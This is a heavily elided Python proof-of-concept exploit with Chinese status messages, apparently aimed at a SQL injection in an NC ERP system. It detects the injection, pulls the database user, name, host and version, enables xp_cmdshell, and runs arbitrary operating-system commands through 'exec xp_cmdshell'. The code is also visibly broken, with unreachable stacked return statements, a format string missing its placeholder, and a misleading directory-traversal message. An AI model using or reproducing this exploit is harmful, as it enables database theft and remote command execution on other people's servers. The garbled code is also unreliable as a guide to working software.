...
def POC_1(target_url):
    ...
    try:
        ...
        if row_1 in response.text and "服务器错误信息：null" not in response.text:
            ...
            return now_time()+ " [SUCCESS]  该系统存在SQL漏洞，漏洞响应为:"
            return now_time()+ " [INFO]     >> 数据库用户为:{}".format(db_user)
            return now_time()+ " [INFO]     >> 数据库名为:{}".format(db_name)
            return now_time()+ " [INFO]     >> 数据库主机名为:{}".format(db_host)
            return now_time()+ " [INFO]     >> 数据库版本为:{}".format(db_vers)
            return now_time()+ " [INFO]     该漏洞有可能可执行命令，请到移步到poc/nc_erp_sql.py进行检查确认\n"
            return db_name
        else:
            return now_time()+" [WARNING]  该系统不存在目录遍历和任意文件读取"
    except:
        return now_time()+" [WARNING]  无法该目标无法建立连接"
...
def xp_cmdshell_open(target_url, db_name):
    ...
    for sql in open_sql:
        ...
        try:
            return now_time()+ " [INFO]     正在执行SQL语句:{}".format(sql)
            ...
            return now_time()+ " [INFO]     开启 xp_cmdsheall 失败"
            sys.exit(0)
...
def POC_3(target_url, cmd):
    ...
    try:
        return now_time()+ " [INFO]     正在执行SQL语句:exec xp_cmdshell '{}'".format(cmd)
        response = requests.post(url=vuln_url, headers=headers, data=data, timeout=20)

        data = re.findall(r'output="(.*?)"', response.text)
        for i in data:
            return now_time()+ " [INFO]     >>> ".format(i)
    except Exception as e:
        return now_time()+ " [INFO]     请求失败:{} ".format(e)
        sys.exit(0)
